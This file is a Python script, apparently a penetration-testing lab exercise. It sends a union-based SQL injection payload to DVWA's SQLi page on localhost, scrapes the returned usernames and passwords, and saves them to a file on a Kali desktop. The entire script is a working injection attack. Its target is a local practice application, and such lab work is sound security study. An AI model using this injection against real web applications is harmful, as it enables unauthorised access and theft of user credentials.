from urllib.request import urlopen
from bs4 import BeautifulSoup

# low mode

# 1' OR 1=1 union select user, password from users#
inj = "1%27+OR+1%3D1+union+select+user%2C+password+from+users"

with urlopen("http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=" + inj + "%23&Submit=Submit#") as response:
    soup = BeautifulSoup(response, "html.parser")

all_results = []
only_cracked_data = []
for el in soup.find_all("pre"):
        before, sep, after = (el.getText().partition('Surname: '))
        another_before, another_sep, another_after = (before + ":" + after).partition('name: ')
        all_results.append(another_after)

for i in range(len(all_results)):
    if i > (len(all_results)/2)-1:
        only_cracked_data.append(all_results[i])

with open('/home/kali/Desktop/passwords.txt', 'w') as fp:
    for item in only_cracked_data:
        fp.write("%s\n" % item)
    fp.close()



